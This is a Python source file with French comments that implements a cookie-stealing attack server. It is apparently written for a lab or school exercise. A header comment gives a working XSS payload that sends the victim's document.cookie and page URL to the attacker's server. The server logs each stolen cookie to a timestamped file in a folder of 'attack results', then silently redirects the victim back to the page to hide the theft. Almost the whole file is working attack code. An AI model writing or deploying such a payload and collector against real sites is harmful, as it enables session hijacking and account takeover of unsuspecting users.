# Serveur python qui va récupérer les paramètres de l'URL,
# qui contiendra les cookies.
# Source : https://pythonbasics.org/webserver/

# injection XSS à mettre (adapter l'IP et le port) :
# <img src="blabla" onerror=window.location.href="http://localhost:8080/URLSITERECHERCHE".replace('RECHERCHE',JSON.stringify(document.cookie)).replace('URL',JSON.stringify(document.URL))>

from http.server import BaseHTTPRequestHandler, HTTPServer
import time
from datetime import datetime
import json

# Réglage de l'ip puis du port du serveur, à adapter avec l'injection XSS
hostName = "localhost"
serverPort = 8080

cheminFichier = "resultats_attaques/attaque-DATE.txt"

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # On récupère tout les parametres
        parametres =self.path[1:].replace("%22","").split("SITE")
        # Séparation des cookies
        cookies = parametres.pop()
        # Formattage de l'URL de retour (pour retirer l'injection xss)
        url=parametres[0]
        url=url[:url.find("?")]
        # On segmente les cookies pour chaque cookie
        cookies = cookies.split("%20")
        # On enregistre dans un fichier
        nomFichier = cheminFichier.replace("DATE",str(datetime.now()))
        with open(nomFichier,"w") as fichier:
            for cookie in cookies:
                fichier.write(cookie+"\n")
            print("\n\tNouvelle récupération de cookies réussie !\n")
        
        # On renvoie l'utilisateur vers la page de recherche
        self.wfile.write(bytes(f"""
            <script>
                window.location.href = "{url}";
            </script>
        """, "utf-8"))

# Lancement du serveur au démarrage
if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s\n" % (hostName, serverPort))
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")